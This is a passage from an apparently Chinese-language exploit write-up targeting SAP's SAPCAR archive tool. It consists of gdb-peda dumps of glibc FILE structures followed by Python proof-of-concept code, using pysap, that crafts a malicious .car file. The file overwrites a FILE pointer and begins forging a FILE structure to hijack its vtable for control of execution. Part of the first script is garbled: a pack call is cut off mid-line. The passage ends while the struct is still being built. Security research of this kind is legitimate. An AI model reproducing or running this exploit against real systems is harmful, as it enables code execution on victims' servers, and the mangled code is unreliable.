      _IO_write_ptr = 0x0, 
      _IO_write_end = 0x0, 
      _IO_buf_base = 0x0, 
      _IO_buf_end = 0x0, 
      _IO_save_base = 0x0, 
      _IO_backup_base = 0x0, 
      _IO_save_end = 0x0, 
      _markers = 0x0, 
      _chain = 0x7ffff6f08540 , 
      _fileno = 0x3, 
      _flags2 = 0x0, 
      _old_offset = 0x0, 
      _cur_column = 0x0, 
      _vtable_offset = 0x0, 
      _shortbuf = "", 
      _lock = 0xa2daf0, 
      _offset = 0xffffffffffffffff, 
      _codecvt = 0x0, 
      _wide_data = 0xa2db00, 
      _freeres_list = 0x0, 
      _freeres_buf = 0x0, 
      __pad5 = 0x0, 
      _mode = 0x0, 
      _unused2 = '00' 
    }
    gdb-peda$ x/xg 0xa2da10 + sizeof(*fp)
    0xa2dae8:    0x00007ffff6f066e0
    gdb-peda$ x/xg 0x00007ffff6f066e0
    0x7ffff6f066e0 :    0x0000000000000000
    gdb-peda$ p _IO_file_jumps
    $6 = {
      __dummy = 0x0, 
      __dummy2 = 0x0, 
      __finish = 0x7ffff6bbd9c0 , 
      __overflow = 0x7ffff6bbe730 , 
      __underflow = 0x7ffff6bbe4a0 , 
      __uflow = 0x7ffff6bbf600 , 
      __pbackfail = 0x7ffff6bc0980 , 
      __xsputn = 0x7ffff6bbd1e0 , 
      __xsgetn = 0x7ffff6bbcec0 , 
      __seekoff = 0x7ffff6bbc4c0 , 
      __seekpos = 0x7ffff6bbfa00 , 
      __setbuf = 0x7ffff6bbc430 , 
      __sync = 0x7ffff6bbc370 , 
      __doallocate = 0x7ffff6bb1180 , 
      __read = 0x7ffff6bbd1a0 , 
      __write = 0x7ffff6bbcb70 , 
      __seek = 0x7ffff6bbc970 , 
      __close = 0x7ffff6bbc340 , 
      __stat = 0x7ffff6bbcb60 , 
      __showmanyc = 0x7ffff6bc0af0 , 
      __imbue = 0x7ffff6bc0b00 
    }
由于我们可以控制文件指针以及输入文件中的数据，我们就可以伪造一个FILE结构并设置一个自定义的vtable指针。
我们将使用pysap库来创建CAR文档，我们可以使用pip命令安装pysap：
    $ pip install pysap
**4.1 重写文件指针**
第一步就是用任意值重写文件指针。我们首先用0x1100字节数据填充缓冲区，然后又添加了某些数据填充了堆空间，指针成功分配之后我们就要重写指针了。
PoC代码如下：
    #!/usr/bin/env python
    import struct
    from scapy.packet import Raw
    from pysap.SAPCAR import *
    def overwrite_FILE_pointer(address):
        fill_buf = "A" * 0x1100
        gap_to_fp = "B" * 0x38
        fp = struct.pack("" + "x00"*32 + "xd0xd0"))
        f._sapcar.files0[0].blocks.append(Raw(data))
        f.write()
    def main():
        write_exp(overwrite_FILE_pointer(0x4242424243434343))
    if __name__ == "__main__":
    main()
运行PoC后会创建一个poc.car文件，然后绑定gdb并运行该文件：
    Stopped reason: SIGSEGV
    _IO_feof (fp=0x4242424243434343) at feof.c:35
**4.2 控制执行流**
接下来要存储我们伪造的FILE结构，我们的运行环境禁用了ASLR，因此我们只能使用硬编码的缓冲区地址。
    #!/usr/bin/env python
    import struct
    from scapy.packet import Raw
    from pysap.SAPCAR import *
    FILE_STRUCT_SIZE = 0xd8
    BUF_ADDRESS = 0xa1c798
    def build_IO_FILE_struct():
        file_struct = ""
        file_struct += struct.pack("<Q", 0x80018001) # _flags
        file_struct += struct.pack("<Q", 0x41414141) # _IO_read_ptr
        file_struct += struct.pack("<Q", 0x42424242) # _IO_read_end
        file_struct += struct.pack("<Q", 0x43434343) # _IO_read_base
        file_struct += struct.pack("<Q", 0x44444444) # _IO_write_base
        file_struct += struct.pack("<Q", 0x45454545) # _IO_write_ptr
        file_struct += struct.pack("<Q", 0x46464646) # _IO_write_end
        file_struct += struct.pack("<Q", 0x47474747) # _IO_buf_base
        file_struct += struct.pack("<Q", 0x48484848) # _IO_buf_end
        file_struct += struct.pack("<Q", 0x49494949) # _IO_save_base
        file_struct += struct.pack("<Q", 0x50505050) # _IO_backup_base
        file_struct += struct.pack("<Q", 0x51515151) # _IO_save_end
        file_struct += struct.pack("<Q", 0x52525252) # _markers
        file_struct += struct.pack("<Q", 0x53535353) # _chain
        file_struct += struct.pack("<L", 0x54545454) # _fileno
        file_struct += struct.pack("<L", 0x55555555) # _flags2
        file_struct += struct.pack("<Q", 0x56565656) # _old_offset
        file_struct += struct.pack("<H", 0x5757)     # _cur_column
        file_struct += struct.pack("<H", 0x58)       # _vtable_offset
        file_struct += struct.pack("<L", 0x59595959) # _shortbuf
        file_struct += struct.pack("<Q", 0x60606060) # _lock
        file_struct += struct.pack("<Q", 0x61616161) # _offset
        file_struct += struct.pack("<Q", 0x62626262) # _codecvt
        file_struct += struct.pack("<Q", 0x63636363) # _wide_data
        file_struct += struct.pack("<Q", 0x64646464) # _freeres_list
        file_struct += struct.pack("<Q", 0x65656565) # _freeres_buf
        file_struct += struct.pack("<Q", 0x66666666) # __pad5
        file_struct += struct.pack("<L", 0x67676767) # _mode
        file_struct += "A" * 20                      # _unused2